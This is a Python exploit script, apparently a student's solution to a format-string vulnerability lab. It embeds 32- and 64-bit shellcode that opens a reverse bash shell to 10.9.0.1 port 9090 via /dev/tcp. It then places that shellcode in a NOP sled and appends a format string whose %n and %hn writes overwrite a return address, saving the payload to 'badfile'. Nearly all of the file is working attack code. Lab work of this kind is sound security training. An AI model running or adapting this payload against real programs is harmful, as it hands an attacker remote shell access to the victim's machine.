#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
start = 500               # Change this number
content[start:start+len(shellcode)] = shellcode

print(len(shellcode) )
############################################################
#
#    Construct the format string here
# 
# This line shows how to store a 4-byte integer at offset 0
#target_high = 0xffff
#target_low = 0xd370 + 500

target_1 = 0x7fff
target_2 = 0xe1d0 + 500
target_3 = 0xffff

#number  = 0xffffd2cc
#number = 0x0000555555558014
number = 0x00007fffffffe124+8
content[1000:1008]  =  (number).to_bytes(8,byteorder='little')
#number = 0x0000555555558010
number = 0x00007fffffffe120+8
content[1008:1016]  =  (number).to_bytes(8,byteorder='little')
#number = 0x0000555555558012
number = 0x00007fffffffe122+8
content[1016:1024]  =  (number).to_bytes(8,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[1004:1008]  = ("abcd").encode('latin-1')
number  = 0xffffd2ce
number = 0x55556008
#content[1008:1012]  =  (number).to_bytes(4,byteorder='little')

s = ""
#for i in range(50):
#	s += str(i) + ":%" + str(i+150) + "$.16lx "
print(len(s)+12)
#s += "%."+str(target_low-len(s)-213)+"x %hn %."+str(target_high-target_low-2)+"x %hn"
s += "%."+str(target_1)+"lx%157$n%."+str(target_2-target_1)+"lx%158$hn%."+str(target_3-target_2)+"lx%159$hn"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[0:len(fmt)] = fmt
############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
